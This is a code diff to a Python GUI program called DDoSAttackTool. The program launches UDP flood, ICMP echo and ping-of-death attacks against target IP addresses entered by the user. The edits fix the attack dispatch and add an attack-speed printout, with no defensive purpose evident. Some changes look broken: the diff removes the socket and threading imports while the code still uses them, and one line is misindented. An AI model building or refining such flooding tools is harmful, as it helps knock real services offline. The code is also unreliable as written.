@@ -1,6 +1,4 @@
 import concurrent.futures 
-import socket
-import threading
 import time
 import tkinter as tk
 import requests
@@ -73,7 +71,7 @@ class DDoSAttackTool:
         burst_interval = float(self.burst_interval_entry.get())
         attack_type = self.attack_type_entry.get()
 
-        if attack_type == "UDP Flood":
+         if attack_type == "UDP Flood":
             attack_thread = threading.Thread(target=self.udp_flood_attack,
                                              args=(target_ips, port, num_packets, burst_interval))
         elif attack_type == "ICMP Echo":
@@ -89,8 +87,8 @@ class DDoSAttackTool:
             attack_thread = threading.Thread(target=self.ping_of_death_attack,
                                              args=(target_ips, num_packets, burst_interval))
         else:
-             print("Invalid attack type selected")
-             return
+            print("Invalid attack type selected.")
+            return
 
         attack_thread.start()
 
@@ -105,7 +103,7 @@ class DDoSAttackTool:
             for target in target_ips:
                 if self.stop_attack_flag:
                     break
-                executor.submit(attack_type, target, port, num_packets, burst_interval)
+                executor.submit(attack_function, target, port, num_packets, burst_interval)
                 time.sleep(1)  # Check the flag every second
 
                 # Update the attack speed label
@@ -119,7 +117,9 @@ class DDoSAttackTool:
         # Update the attack status label
         self.attack_status_label.config(text="Attack Status: Not in Progress")
         self.root.update()
-      
+
+        print(f"Final attack speed: {self.get_attack_speed():.2f} GB/s")
+
     def stop_attack(self):
         self.stop_attack_flag = True
 
@@ -159,7 +159,7 @@ class DDoSAttackTool:
             for _ in range(num_packets):
                 sock.sendto(b"", (target_ip, port))
                 self.attack_num += 1
-                packet_size = len(b"Cadel")  
+                packet_size = len(b"")  # Replace b"" with the actual packet data
                 self.total_bytes_sent += packet_size
                 print(f"Sent {self.attack_num} packet to {target_ip} through port: {port}")
                 time.sleep(burst_interval)
